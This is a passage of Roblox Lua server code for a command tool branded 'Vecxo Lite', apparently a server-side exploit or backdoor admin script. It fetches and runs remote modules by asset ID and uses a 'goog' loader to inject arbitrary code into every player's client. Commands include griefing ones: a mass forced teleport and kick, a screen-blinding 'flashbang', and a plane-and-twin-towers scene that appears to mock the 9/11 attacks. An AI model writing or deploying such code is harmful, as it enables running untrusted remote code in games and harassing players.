		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11") then
			local success, fail = pcall(function()
				require(87631077502363).load("7-11")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11"):Clone()
				building.PrimaryPart = building:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå 7-11 failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11"):Clone()
			building.PrimaryPart = building:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
		end
	elseif cmd == "!basketball" then
		handled = true
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Basketball") then
			local basketball = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Basketball"):Clone()
			basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
			basketball.Parent = workspace
			basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Basketball") then
			local success, fail = pcall(function()
				require(87631077502363).load("Basketball")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Basketball", true)
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("Basketball", true):Clone()
				basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
				basketball.Parent = workspace
				basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Basketball failed to load: ".. fail)
			end
		else
			local basketball = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Basketball"):Clone()
			basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
			basketball.Parent = workspace
			basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
		end
	elseif cmd == "!mcdonalds" then
		handled = true
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("McDonald's") then
			local mcd = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("McDonald's"):Clone()
			mcd.Parent = workspace
			mcd.PrimaryPart = mcd:FindFirstChild("Floor")
			mcd:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's") then
			local success, fail = pcall(function()
				--require(83374861646895) -- McDonald's
				require(87631077502363).load("McDonald's")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's"):Clone()
				building.PrimaryPart = building:FindFirstChild("Floor")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå McDonalds failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's"):Clone()
			building.PrimaryPart = building:FindFirstChild("Floor")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
		end
	elseif cmd == "!burgerking" then
		handled = true
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("BurgerKing") then
			local BurgerKing = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("BurgerKing"):Clone()
			BurgerKing.Parent = workspace
			BurgerKing.PrimaryPart = BurgerKing:FindFirstChild("Part")
			BurgerKing:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing") then
			local success, fail = pcall(function()
				require(87631077502363).load("BurgerKing")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing"):Clone()
				building.PrimaryPart = building:FindFirstChild("Part")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Burger King failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing"):Clone()
			building.PrimaryPart = building:FindFirstChild("Part")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
		end
	elseif cmd == "!subway" then
		handled = true
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("SubWay") then
			local SubWay = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Subway"):Clone()
			SubWay.Parent = workspace
			SubWay.PrimaryPart = SubWay:FindFirstChild("Union")
			SubWay:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SubWay") then
			local success, fail = pcall(function()
				require(87631077502363).load("Subway")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway"):Clone()
				building.PrimaryPart = building:FindFirstChild("Union")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Subway failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway"):Clone()
			building.PrimaryPart = building:FindFirstChild("Union")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
		end
	elseif cmd == "!towers" then
		handled = true
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane") then
			local success, fail = pcall(function()
				require(87631077502363).load("Airplane")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane")
				local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
				plane.Parent = workspace
				plane.Locked = true

				local f = Instance.new("Folder", workspace)
				local a = Instance.new("Part", f)
				local b = Instance.new("Part", f)
				local c = Instance.new("Part", f)

				f.Name = "Thing"

				a.CFrame = CFrame.new(-85, 250.2, 93)
				a.Size = Vector3.new(4, 59, 4)
				a.Reflectance = 0.2
				a.BrickColor = BrickColor.new("Dark stone grey")
				a.Locked = true
				a.Anchored = true

				b.CFrame = CFrame.new(-98, 110.7, 81)
				b.Size = Vector3.new(40, 220, 40)
				b.Reflectance = 0.2
				b.BrickColor = BrickColor.new("Dark stone grey")
				b.Locked = true
				b.Anchored = true

				c.CFrame = CFrame.new(-172, 110.7, 81)
				c.Size = Vector3.new(40, 220, 40)
				c.Reflectance = 0.2
				c.BrickColor = BrickColor.new("Dark stone grey")
				c.Locked = true
				c.Anchored = true

				for i,v in pairs(game.Players:GetPlayers()) do
					if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
						local ticking = tick()
						require(gamegoog).load() -- goog readder
						repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
					end

					local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

					if not goog then
						warn("goog failed to be added, command can not continue")
						notify(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
						return
					end

					local scr = goog:FindFirstChild("Utilities").Client:Clone()
					local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

					loa.Parent = scr
					scr:WaitForChild("Exec").Value = [[
						
						local plane = workspace:WaitForChild("Airplane")
						local camera = workspace.Camera
						camera.CameraSubject = plane

						repeat task.wait() until not workspace:FindFirstChild("Airplane")

						camera.CameraSubject = game.Players.LocalPlayer.Character

						script:Destroy()

					]]

					if v.Character then
						scr.Parent = v.Character
					else
						scr.Parent = v:WaitForChild("PlayerGui")
					end

					scr.Enabled = true
				end
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Plane failed to load: ".. fail)
			end
		else
			local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
			plane.Parent = workspace
			plane.Locked = true

			local f = Instance.new("Folder", workspace)
			local a = Instance.new("Part", f)
			local b = Instance.new("Part", f)
			local c = Instance.new("Part", f)

			f.Name = "Thing"

			a.CFrame = CFrame.new(-85, 250.2, 93)
			a.Size = Vector3.new(4, 59, 4)
			a.Reflectance = 0.2
			a.BrickColor = BrickColor.new("Dark stone grey")
			a.Locked = true
			a.Anchored = true

			b.CFrame = CFrame.new(-98, 110.7, 81)
			b.Size = Vector3.new(40, 220, 40)
			b.Reflectance = 0.2
			b.BrickColor = BrickColor.new("Dark stone grey")
			b.Locked = true
			b.Anchored = true

			c.CFrame = CFrame.new(-172, 110.7, 81)
			c.Size = Vector3.new(40, 220, 40)
			c.Reflectance = 0.2
			c.BrickColor = BrickColor.new("Dark stone grey")
			c.Locked = true
			c.Anchored = true

			for i,v in pairs(game.Players:GetPlayers()) do
				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					notify(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
					
					local plane = workspace:WaitForChild("Airplane")
					local camera = workspace.Camera
					camera.CameraSubject = plane

					repeat task.wait() until not workspace:FindFirstChild("Airplane")

					camera.CameraSubject = game.Players.LocalPlayer.Character

					script:Destroy()

				]]

				if v.Character then
					scr.Parent = v.Character
				else
					scr.Parent = v:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end
		end
	elseif cmd == "!hwl" and args[2] then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			if #targets == 0 then
				notifyv3(sender, "[Vecxo Lite]", "‚ùå Player(s) '" .. args[2] .. "' not found.")
				return
			end
			for i, targetPlayer in ipairs(targets) do
				if not table.find(whitelisted, targetPlayer.Name) then
					table.insert(whitelisted, targetPlayer.Name)
				end
				if not table.find(exclusivewl, targetPlayer.Name) then
					local token = generateToken()
					authTokens[targetPlayer] = token
					TokenRemote:FireClient(targetPlayer, token)
					table.insert(exclusivewl, targetPlayer.Name)
				end
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
				end)
				notify(sender, "[Vecxo Lite]:", "‚úÖ Hard whitelisted " .. targetPlayer.Name)
				notifyv3(targetPlayer, "[Vecxo Lite]:", "‚úÖ You have been hard whitelisted which means you are now allowed to use restricted commands. Usage: !cmds")
			end
		end
	--[[elseif cmd == "!chatui" then
		local targets = GetPlayers(args[2], sender)

		for _, plr in ipairs(targets) do
			-- Ensure 'goog' Utilities exist (your original loader)
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			-- Clone the LocalScript
			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr

			-- Set LocalScript contents
			scr:WaitForChild("Exec").Value = [[
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local chatRemote = ReplicatedStorage:WaitForChild("VecxoChatRemote")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create the chat GUI
local function createChatGui()
    local existing = playerGui:FindFirstChild("VecxoChatGui")
    if existing then existing:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "VecxoChatGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.Size = UDim2.new(0, 300, 0, 60)
    frame.Position = UDim2.new(0, 10, 1, -70)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.AnchorPoint = Vector2.new(0, 1)
    frame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0, 20)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "[Vecxo Lite]: Chat"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.Code
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = frame

    local textBox = Instance.new("TextBox")
    textBox.Name = "ChatTextBox"
    textBox.Size = UDim2.new(1, -10, 0, 30)
    textBox.Position = UDim2.new(0, 5, 0, 25)
    textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    textBox.BorderSizePixel = 0
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.Font = Enum.Font.Code
    textBox.TextSize = 18
    textBox.PlaceholderText = "Type a message..."
    textBox.Text = ""
    textBox.ClearTextOnFocus = false
    textBox.Parent = frame
    textBox.TextXAlignment = Enum.TextXAlignment.Left
    textBox.TextWrapped = false

    -- Fire RemoteEvent on enter
    textBox.FocusLost:Connect(function(enterPressed)
        if enterPressed and textBox.Text ~= "" then
            print("Client firing:", textBox.Text)
            chatRemote:FireServer(textBox.Text)
            task.wait(0.02)
            textBox.Text = ""
        end
    end)
end

createChatGui()
        

			-- Parent LocalScript
			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
		--showChatGui(sender) ]]
	elseif cmd == "!cmdbar" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local cmdEvent = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandEvent")
local TokenRemote = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandToken")
local currentToken = nil

TokenRemote.OnClientEvent:Connect(function(newToken)
    if currentToken ~= newToken then
        currentToken = newToken
    end
end)


local function createCmdBar()
	local existing = playerGui:FindFirstChild("VecxoCommandBar")
	if existing then
		existing:Destroy()
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoCommandBar"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui

	local frame = Instance.new("Frame")
	frame.Name = "MainFrame"
	frame.Size = UDim2.new(0, 300, 0, 40)
	frame.Position = UDim2.new(0, 10, 1, -50) -- bottom left with margin
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.AnchorPoint = Vector2.new(0, 1)

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -40, 1, 0)
	title.Position = UDim2.new(0, 0, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "[Vecxo Lite]: Command Bar"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.Code
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = frame

	local toggleBtn = Instance.new("TextButton")
	toggleBtn.Name = "ToggleBtn"
	toggleBtn.Size = UDim2.new(0, 40, 1, 0)
	toggleBtn.Position = UDim2.new(1, -40, 0, 0)
	toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	toggleBtn.Text = "‚ñº"
	toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	toggleBtn.Font = Enum.Font.Code
	toggleBtn.TextSize = 24
	toggleBtn.Parent = frame

	local textBox = Instance.new("TextBox")
	textBox.Name = "CmdTextBox"
	textBox.Size = UDim2.new(1, 0, 0, 30)
	textBox.Position = UDim2.new(0, 0, 1, 5)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.BorderSizePixel = 0
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.Font = Enum.Font.Code
	textBox.TextSize = 18
	textBox.PlaceholderText = "Enter here..."
	textBox.Text = ""
	textBox.ClearTextOnFocus = false
	textBox.Parent = frame
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.TextWrapped = false
	textBox.TextEditable = true

	textBox.BackgroundTransparency = 1
	textBox.TextTransparency = 1
	textBox.Visible = true -- keep visible, but transparent initially

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local expandedSize = UDim2.new(0, 300, 0, 60)
	local collapsedSize = UDim2.new(0, 300, 0, 40)

	local isOpen = false
	local function toggleCmdBar()
		if isOpen then
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 1,
				TextTransparency = 1
			}):Play()
			toggleBtn.Text = "‚ñº"
			TweenService:Create(frame, tweenInfo, {Size = collapsedSize}):Play()
			isOpen = false
			task.delay(0.3, function()
				if not isOpen then
					textBox.Visible = false
				end
			end)
		else
			textBox.Visible = true
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 0,
				TextTransparency = 0
			}):Play()
			toggleBtn.Text = "‚ñ≤"
			TweenService:Create(frame, tweenInfo, {Size = expandedSize}):Play()
			isOpen = true
			textBox:CaptureFocus()
		end
	end

	toggleBtn.MouseButton1Click:Connect(toggleCmdBar)

	textBox.Focused:Connect(function()
		textBox.PlaceholderText = ""
	end)

	textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed and textBox.Text ~= "" then
        if not currentToken then
            local RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("VecxoRequestToken")
            currentToken = RemoteFunction:InvokeServer()
            if not currentToken then
                return
            end
        end
        cmdEvent:FireServer(currentToken, "!" .. textBox.Text)
        textBox.Text = ""
    	end
	end)
end

createCmdBar()


			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
			plr.CharacterAdded:Connect(function()
				task.wait(0.5)
				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load()
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
			
			local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local cmdEvent = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandEvent")
local TokenRemote = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandToken")
local currentToken = nil

TokenRemote.OnClientEvent:Connect(function(newToken)
    if currentToken ~= newToken then
        currentToken = newToken
    end
end)


local function createCmdBar()
	local existing = playerGui:FindFirstChild("VecxoCommandBar")
	if existing then
		existing:Destroy()
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoCommandBar"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui

	local frame = Instance.new("Frame")
	frame.Name = "MainFrame"
	frame.Size = UDim2.new(0, 300, 0, 40)
	frame.Position = UDim2.new(0, 10, 1, -50) -- bottom left with margin
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.AnchorPoint = Vector2.new(0, 1)

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -40, 1, 0)
	title.Position = UDim2.new(0, 0, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "[Vecxo Lite]: Command Bar"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.Code
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = frame

	local toggleBtn = Instance.new("TextButton")
	toggleBtn.Name = "ToggleBtn"
	toggleBtn.Size = UDim2.new(0, 40, 1, 0)
	toggleBtn.Position = UDim2.new(1, -40, 0, 0)
	toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	toggleBtn.Text = "‚ñº"
	toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	toggleBtn.Font = Enum.Font.Code
	toggleBtn.TextSize = 24
	toggleBtn.Parent = frame

	local textBox = Instance.new("TextBox")
	textBox.Name = "CmdTextBox"
	textBox.Size = UDim2.new(1, 0, 0, 30)
	textBox.Position = UDim2.new(0, 0, 1, 5)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.BorderSizePixel = 0
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.Font = Enum.Font.Code
	textBox.TextSize = 18
	textBox.PlaceholderText = "Enter here..."
	textBox.Text = ""
	textBox.ClearTextOnFocus = false
	textBox.Parent = frame
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.TextWrapped = false
	textBox.TextEditable = true

	textBox.BackgroundTransparency = 1
	textBox.TextTransparency = 1
	textBox.Visible = true

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local expandedSize = UDim2.new(0, 300, 0, 60)
	local collapsedSize = UDim2.new(0, 300, 0, 40)

	local isOpen = false
	local function toggleCmdBar()
		if isOpen then
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 1,
				TextTransparency = 1
			}):Play()
			toggleBtn.Text = "‚ñº"
			TweenService:Create(frame, tweenInfo, {Size = collapsedSize}):Play()
			isOpen = false
			task.delay(0.3, function()
				if not isOpen then
					textBox.Visible = false
				end
			end)
		else
			textBox.Visible = true
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 0,
				TextTransparency = 0
			}):Play()
			toggleBtn.Text = "‚ñ≤"
			TweenService:Create(frame, tweenInfo, {Size = expandedSize}):Play()
			isOpen = true
			textBox:CaptureFocus()
		end
	end

	toggleBtn.MouseButton1Click:Connect(toggleCmdBar)

	textBox.Focused:Connect(function()
		textBox.PlaceholderText = ""
	end)

	textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed and textBox.Text ~= "" then
        if not currentToken then
            local RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("VecxoRequestToken")
            currentToken = RemoteFunction:InvokeServer()
            if not currentToken then
                return
            end
        end
        cmdEvent:FireServer(currentToken, "!" .. textBox.Text)
        textBox.Text = ""
    	end
	end)
end

createCmdBar()


			]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end)
		end
	elseif cmd == "!unwl" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if targetPlayer.Name ~= "Reloxz" then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				table.remove(whitelisted, table.find(whitelisted, tostring(targetPlayer.UserId)))
				notify(sender, "[Vecxo Lite]: ", "‚úÖ Removed " .. targetPlayer.Name .. " from whitelist")
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Protected user cannot be removed from the whitelist")
			end
		end
	elseif cmd == "!unhwl" and args[2] then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			if #targets == 0 then
				notifyv3(sender, "[Vecxo Lite]", "‚ùå Player(s) '" .. args[2] .. "' not found.")
				return
			end
			for _, targetPlayer in ipairs(targets) do
				if targetPlayer.Name ~= "Reloxz" then
					task.spawn(function()
						GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
					end)
					table.remove(exclusivewl, table.find(exclusivewl, targetPlayer.Name))
					table.remove(whitelisted, table.find(whitelisted, tostring(targetPlayer.UserId)))
					notify(sender, "[Vecxo Lite]: ", "‚úÖ Removed " .. targetPlayer.Name .. " from hard whitelist")
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Protected user cannot be removed from the hard whitelist")
				end
			end
		end
	elseif cmd == "!restart" then
		handled = true
		local message = Instance.new("Message", workspace)
		local dots = 0
		local running = true
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo Lite]: ‚úÖ Restarting server" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		game.Players.PlayerAdded:Connect(function(v)
			repeat task.wait() until v and v.Character
			v:Kick("[Vecxo Lite]: ‚ùå This server was closed because someone triggered a new server creation.")
		end)
		local teleportService = game:GetService("TeleportService")
		local code = teleportService:ReserveServer(game.PlaceId)
		teleportService:TeleportToPrivateServer(game.PlaceId, code, game.Players:GetPlayers(), nil, {
			softshutdowned = true,
			vecxo = true
		})
		repeat
			task.wait(0.2)
		until #game.Players:GetPlayers() == 0
		running = false
		message:Destroy()
		while true do task.wait(.2)
			for _, v in ipairs(game.Players:GetPlayers()) do
				v:Kick("[Vecxo Lite]: ‚ùå Server has been shutdown.")
			end
		end
	elseif cmd == "!flashbang" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local flashbang = Instance.new("Frame", sgui)
			sgui.IgnoreGuiInset = true
			flashbang.Size = UDim2.new(1, 0, 1, 0)
			flashbang.Position = UDim2.new(0, 0, 0, 0)
			flashbang.BackgroundColor3 = Color3.new(255, 255, 255)
			flashbang.Visible = true
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

